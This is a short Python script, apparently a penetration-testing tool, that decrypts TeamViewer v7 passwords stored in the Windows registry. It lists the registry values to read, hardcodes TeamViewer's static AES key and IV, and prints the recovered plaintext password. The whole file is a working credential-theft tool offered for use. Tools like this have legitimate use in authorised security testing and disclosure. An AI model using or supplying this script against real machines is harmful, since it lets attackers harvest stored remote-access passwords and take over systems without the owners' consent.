#!/usr/bin/python3

import re
import sys
import binascii
import argparse
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# This script is a copy from the following website: https://whynotsecurity.com/blog/teamviewer/
# Basically just a backup since, such resources often disappear at some point :)
# Modifications were applied to make it compatible with cryptography module.
# Keys: HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7 -> 
#       OptionsPasswordAES, SecurityPasswordAES, ServerPasswordAES, ProxyPasswordAES

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_regex = re.compile('[a-fA-F0-9]+')

parser = argparse.ArgumentParser(description='''Decryption script for TeamViewer v7 encrypted passwords
                                                - Original code by @whynotsecurity.  Edited and ported to
                                                cryptography module by @qtc_de.''')

parser.add_argument('ciphertext', help='encrypted TeamViewer password from the registry')
args = parser.parse_args()

if not hex_regex.match(args.ciphertext):
    print("[-] Error: Expected hex formatted encrypted password")
    print("[-] Aborting.")

else:
    ciphertext = binascii.unhexlify(args.ciphertext)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))

    decryptor = cipher.decryptor()
    decrypted = decryptor.update(ciphertext) + decryptor.finalize()

    try:
        print("[+] Decrypted password: " + decrypted.decode('utf-16'))

    except UnicodeDecodeError:
        print("[-] Decrypted password is not UTF-16 formatted and probably junk.")
        print(b"[-] Decrypted: " + decrypted)
